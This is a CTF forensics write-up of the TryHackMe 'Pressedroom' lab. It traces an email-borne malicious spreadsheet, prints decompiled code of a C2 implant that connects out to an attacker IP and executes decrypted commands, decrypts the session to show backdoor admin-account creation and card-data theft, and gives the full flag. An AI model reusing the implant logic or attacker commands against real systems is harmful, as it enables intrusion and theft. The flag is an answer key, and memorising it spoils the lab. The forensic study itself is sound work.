---
title: "Pressedroom: TryHachMe Lab"
published: 2025-09-15
description: 'a detailed write-up of the Hach Me lab from Pressedroom'
image: '/thm-pressedroom/logo.png'
tags: ["TryHackme","DFIR","Medium"]
category: 'CTF'
draft: false 
lang: 'en'
---

## Overview
**Description**: In this lab, you will be given a memory dump of a compromised Windows
**Difficulty**: Medium<br/>
**Category**: DFIR (Digital Forensics and Incident Response)<br/>
**Points**: 50<br/>

the challenge provided a pcap file, let's open it with wireshark ans start analyzing it.

## Analyzing the PCAP File
### Initial Inspection:
i always start by looking at the statistics->protocol hierarchy to get a general idea about the protocols used in the capture.
<img src="/thm-pressedroom/protocol-hirarchy.png" alt="protocol hirarchy"/>

we can see that there is three main protocols, SMTP, POP, TCP and 1 http packet.

we always start with http since it gives a lot of info
<img src="/thm-pressedroom/http-packet.png" alt="http-packet"/>
we can see that there is a GET request to /client.exe, it's likely a malware download, but seeing that the packet number is 2962, made me think that there is a lot going on before this request.


### Following the TCP Stream
there is a lot of tcp packets, after it i see smb2 packets, followed by a successful authentication to PressedComputer with the username guest, after that just smb3 encrypted packets.
<img src="/thm-pressedroom/smb2-login.png" alt="smb2-login"/>

Next, I observed POP packets. The attacker attempted to brute-force the passwords for hazel@pressed.thm and smokey@pressed.thm but failed.

after that i can see that somehow the attacker managed to login as hazel@pressed.thm using the password `asswor` using IMAP (internet Message Access Protocol) which is used by email clients.
<img src="/thm-pressedroom/login-suc.png" alt="login-succussfully"/>

after the attacker gained access to the email account, he sent an email to smokey@pressed.thm with an attachement `sheet.ods`
<img src="/thm-pressedroom/email.png" alt="email"/>

## Analysing sheet.ods file

after i extracted the attachment and decoded it from base64 and saved it as sheet.ods, i tried opening it excel but it contained nothing, then i extracted it and found an `evil.xml` file inside 
<img src="/thm-pressedroom/finding-evil.png" alt="finding-evil"/>

Next, i found that it's the one making the get request to download client.exe from the attacker machine, and executing it, and also it gave us the first part of the flag b64-encoded `VEhNe0FfQzJfTUF5Xw==` which gives us `THM{A_C2_MAy_`
<img src="/thm-pressedroom/evil.png" alt="evil.xml"/>
now let's extract `client.exe` file and analyse it

## Analysing the Ma lware

after i opened client.exe in Ghidra, and started looking into the main function:
```c
  __main();
  snprintf(&key,0x21,&DAT_1401c30de,"rhI1YazJLaLVgWv4","VKf7EQIvl8ps6MJj");
  iVar1 = WSAStartup(0x202,&local_1c8);
  if (iVar1 != 0) {
    handleErrors("WSAStartup");
  }
  local_20 = socket(2,1,0);
  if (local_20 == 0xffffffffffffffff) {
    handleErrors("socket");
  }
  local_1d8.sa_family = 2;
  local_1d8.sa_data._0_2_ = htons(0x1bb);
  iVar1 = inet_pton(2,"10.13.44.207",local_1d8.sa_data + 2);
  if (iVar1 < 1) {
    handleErrors("inet_pton");
  }
  iVar1 = connect(local_20,&local_1d8,0x10);
  if (iVar1 == -1) {
    handleErrors("connect");
  }
  printf("Connected to the server.\n");
  while( true ) {
    local_24 = recv(local_20,local_29e8,0x400,0);
    if (local_24 < 1) break;
    local_1dc = 0;
    aes_decrypt(local_29e8,local_24,local_25e8,&local_1dc);
    local_25e8[local_1dc] = 0;
    printf("Received command: %s\n",local_25e8);
    pcVar4 = local_21e8;
    for (lVar3 = 0x200; lVar3 != 0; lVar3 = lVar3 + -1) {
      pcVar4[0] = '\0';
      pcVar4[1] = '\0';
      pcVar4[2] = '\0';
      pcVar4[3] = '\0';
      pcVar4[4] = '\0';
      pcVar4[5] = '\0';
      pcVar4[6] = '\0';
      pcVar4[7] = '\0';
      pcVar4 = pcVar4 + 8;
    }
    execute_command(local_25e8,local_21e8,0x1000);
    local_1e0 = 0;
    sVar2 = strlen(local_21e8);
    aes_encrypt(local_21e8,sVar2 & 0xffffffff,local_11e8,&local_1e0);
    iVar1 = send(local_20,local_11e8,local_1e0,0);
    if (iVar1 == -1) {
      handleErrors(&DAT_1401c3144);
    }
  }
  closesocket(local_20);
  WSACleanup();
  return 0;
```

this is pretty straightforward c2, the program connects to the attacker machine at `10.13.44.207` on port `443` and receives commands, decrypts them using aes, let's look at aes_decrypt function
```c
void aes_decrypt(undefined8 param_1,undefined4 param_2,longlong param_3,int *param_4)

{
  int iVar1;
  undefined8 uVar2;
  undefined4 uVar3;
  int local_14;
  longlong local_10;
  
  local_10 = EVP_CIPHER_CTX_new();
  if (local_10 == 0) {
    handleErrors("EVP_CIPHER_CTX_new");
  }
  uVar2 = EVP_aes_256_cbc();
  uVar3 = 1;
  iVar1 = EVP_DecryptInit_ex(local_10,uVar2,0,&key,"pEw8P3PU9kCcG4sj");
  if (iVar1 != 1) {
    handleErrors("EVP_DecryptInit_ex");
  }
  local_14 = 0;
  iVar1 = EVP_DecryptUpdate(local_10,param_3,&local_14,param_1,CONCAT44(uVar3,param_2));
  if (iVar1 != 1) {
    handleErrors("EVP_DecryptUpdate");
  }
  *param_4 = local_14;
  iVar1 = EVP_DecryptFinal_ex(local_10,local_14 + param_3,&local_14);
  if (iVar1 != 1) {
    handleErrors("EVP_DecryptFinal_ex");
  }
  *param_4 = *param_4 + local_14;
  EVP_CIPHER_CTX_free(local_10);
  return;
}
```
the iv is `pEw8P3PU9kCcG4sj` and the key is a global variable, going back to main function we can see how the key is generated:
```c
  snprintf(&key,0x21,&DAT_1401c30de,"rhI1YazJLaLVgWv4","VKf7EQIvl8ps6MJj");
```

the key is generated using snprintf with two strings `rhI1YazJLaLVgWv4` and `VKf7EQIvl8ps6MJj` which gives us `rhI1YazJLaLVgWv4VKf7EQIvl8ps6MJj` as the key.
now let's get the c2 traffic from wireshark to decrypt it.

## Extracting & Decrypting the C2 Traffic
just after the client.exe download, we can see the c2 traffic between the attacker and the victim machine.
<img src="/thm-pressedroom/traffic.png" alt="c2-traffic"/>

i got the traffic and decrypted it using the following python script:

```python
from Cryptodome.Cipher import AES


# AES-CBC decryption with PKCS7 padding
def aes_decrypt(ciphertext: bytes) -> bytes:
    key = b"rhI1YazJLaLVgWv4VKf7EQIvl8ps6MJj"
    iv = b"pEw8P3PU9kCcG4sj"  

    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext_padded = cipher.decrypt(ciphertext)

    # Strip PKCS#7 padding
    pad_len = plaintext_padded[-1]
    return plaintext_padded[:-pad_len]

c = [
    "fcc44520bbf8344c3c6fff2be387fe59",
    "6a45b8f4ecf91e260471f1dd47d82c5925d9e0356b16f4f9f056dcbc6f77aa6d",
    "1220b16630b84067c78ffb13915e8735bdb43608954e45203bccc5d8f72c7e4707dced8ae4cb01cfd078bc0051b56a196d85a59bff6d4974325c73b5692827ab",
    "8d96a5599917bb5567ea0ba980a8963aac27502edd7d21fac5bf2e4b849f00d79b4800938ac48f59bb3d49bca8a045e0",
    "ba8ffa0eb7d52a61bed3a892d9411076f4842dc910c643aeaac8204a05f170b9f789c6b7e0aef2de42993ac95ce07659182ce016e3befd6660fdec45804f7364",
    "8d96a5599917bb5567ea0ba980a8963aac27502edd7d21fac5bf2e4b849f00d79b4800938ac48f59bb3d49bca8a045e0",
    "2ce7647a224b27c57143d046146c8b1fa04954d55f64cca4ded256e251a65cbd2679642c730207a90700a7241f8b989c",
    "5a1e3eeb43af06740acbdbb29a4bec9474cbcda837f96d4e40feb10304e937eb2d4562f7ab9498fa9217da03d5dcb03deb73c51d113dafd215ed6805c4386e4041bc9b64036994e85b10a9aa8a6d376f22b1ce9889acaa4209ddb7459d7155d6cad497fd62ccf465617fea135cf6c905b43a6c1e30c4d0c398f2dc6412093c45aea875d9ca226a938a446f186603d3b0371915b2e3c570891aa677ce6108758087f54f34df1ef78fc9a70412d1c6842bc9e5c3e56ad548c36fe6f4f8966594e3312644da48a65427a45365d1a6ab89a15e1c4e6cd0cf8dfee810a7f1ea0ced12f8b41a85c87809644002cc10a9a7aa6ca5232eb332e74941e8da91c4758f8eb3e5a4cac3d84298b00f96715d4150e01b67f6c285cac26a4afb3858796a61f69ba1d70d47bae714ded2bd9b174344b719921b42c79e4592437825adf0978fb3f1417d206efd3a60f4821811987c4104b514f319d0757961815d5446597c8f077599f9d238bfaeb1fb4643076025c6752eb0b03ce7b225ae8379744fc1c76cf5319a1194a283854318c28146e7401ab9c418a570cef5cd8ae90db476031e142cf8c1841c5fe097e0c7727536a5da5f48e6056f72bcbd9bc6805fadb2c46f12e45eeddbc697ea6d39d6ce3c9fd4c8ae67649f129d63564b78290e2d7b727f537bf5ff50098540903c643112720660b3b22c",
    "9b8f6df3bd93c3ab10af70c980e231bfac35c591cd0bd0aba8c9104cd30dfbe56b2542aa70e39191db65a5cd2951bcf4",
    "d5303d95b5c8ebea7692402db7118e95bfce2f60ec980d0a0ae57ace971035450d9b1f53ecc5f02ef2efa330fc8b1894ce16cfeedb1e9e73284b65e5a99819721d2fe4c538a671f6edc2394be605ff935988b628cc7e08febf002be9442338f59707e588b535f929a84a89f7ec96b4294e135263145ea196420966ba747d7e90576965fd8e4e39b60f08fe466893338e51e88eeef91f527f5ca51fac6021a19cf9ac8025b4c1e6819740ffa19c2b4f0b3c7ae160c6fcaee2ec81ef2332e71a25e4f67d5cefb21e788a034636282ea0dde4b8e5912db955ab253bcd98fd1467056c3f3814900383ef9d96a4d421a1a0caba4323c97952deb2d7a5cc8bb631acdb31dc05a633676563c20e50f08777b16598f8e497389e9e31648b869843c6cb00be915b5c1992f46ebee1dca68980c722a2c9b6d721e6c9cbb072407dc66b914189c917c74e6db230de6d6d0b3393add952bb4d2f30c45fae06aca3899b6800947eb642a275238e51cbbd6a21c501d98a393069f555843a4d42171a144dad683df6a4f924d6151604b9cd1f74483dc5bbafd1fa035a1fe1d89ec387d71e0100cf891075fb8e35c2505493e8f1626d7532884a0a92a4c64dc406280f628103b185fa75c14f7c46cdab71578f10b987fa0d3a6d80def05b6861f46cf8c4e331eff2aca120871689ac4d85599ec5f066b85c00b9d50d72f3ad858e4ba8eb9e52e96b65ab1fc48bf1f1328ae07dcefedc5f392631ff1c0c111d62fd459691d874ce2dde93a5bae5e6cdbcb0b43deb3a64b81e13bfd10a9480b1f058fa2f95077ffd1a3ffdd1313ef862d1b4bb35101d2d5d5b04bf1be55699e90287b09395ef2e8dd52bcf0f3f319924843bb0726da55608e181711563c8d4258bba912a2c086fce72a8d521efd10c230d40941b19d880f0494628489be6713e2e815c63b62151d4632f1d0e1de2fcd74f09539e7306d989567e5fc6c914a9954e66b1b3798ebf2f5822ffa44bc7102a25f54621d6bdffb745ff8cf9b4f17d84e9080068a4a0fb3845525c1b80c1f1f935f03c7294d809356db973602d4425d3fdfea1082cfcdc5639300e1b9834fc8c5ad7da583dacee616746baf691584ea7a5ac78211c6119f3c533d24d7741efabf39ef8d26c8bfc58bb711c0b1e75a73943254947e9cfb3aae7f9511f78d238d75c1afc40be93214a03",
]
d = []
for part in c:
    d.append(bytes.fromhex(part))
for a in d:
    print(aes_decrypt(a).decode("utf-8"))
```

this will give us the decrypted commands:
```bash
whoami
pressedcomputer\administrator

net user administratorr RWx1RDNfWTB1X1doM25fWW91Xw== /add /Y
The command completed successfully.


net localgroup administrators administratorr /add
The command completed successfully.


dir C:\Users\Administrator\Desktop\
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

05/11/2025  01:21 AM    <DIR>          .
05/11/2025  01:21 AM    <DIR>          ..
05/11/2025  12:29 AM               840 clients.csv
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
               3 File(s)          1,921 bytes
               2 Dir(s)   6,116,753,408 bytes free

type C:\Users\Administrator\Desktop\clients.csv
id,first_name,cards
1,Kristina,3576458480892700
2,Vincenz,6377289692238729
3,Lynnett,502083133236470823
4,Willy,3529610352793949
5,Maryjo,5018887044140690101
6,Marigold,3562096088860871
7,Tedra,5100145340581462
8,Dita,374622610631912
9,Lilas,50184655540100116
10,Sybila,337941913325253
11,Iseabal,560224746120829081
12,Dotti,5261652156343239
13,Tessa,201879631316647
14,Adolph,374622215114868
15,Erskine,3542911130825612
16,Cyndie,3570664276667588
17,Gabriel,3545817387044384
18,Tani,3545260532217102
19,Goldie,3536353114355357
20,Ingram,630456178681475528
21,Morissa,QXJlX1ByZSRzM2RfNF9UaW0zfQ==
22,Shelia,201766968942709
23,Mikel,3558557239071912
24,Manya,3578351764405158
25,Cullen,3543833584578068
26,Rowland,201770928146237
27,Merilee,3536700865014213
28,Wiley,4911540419701894811
29,Harlin,3542950948982249
30,Michal,5462675671244662
```

we can see two base64 encoded strings:  
 - `RWx1RDNfWTB1X1doM25fWW91Xw==` -> `EluD3_Y0u_Wh3n_You_` 
 - `QXJlX1ByZSRzM2RfNF9UaW0zfQ==` -> `Are_Pre$s3d_4_Tim3}`

Part 1: VEhNe0FfQzJfTUF5Xw== -> THM{A_C2_MAy_<br/>
Part 2: RWx1RDNfWTB1X1doM25fWW91Xw== -> EluD3_Y0u_Wh3n_You_<br/>
Part 3: QXJlX1ByZSRzM2RfNF9UaW0zfQ== -> Are_Pre$s3d_4_Tim3}<br/>

final flag: `THM{A_C2_MAy_EluD3_Y0u_Wh3n_You_Are_Pre$s3d_4_Tim3}`
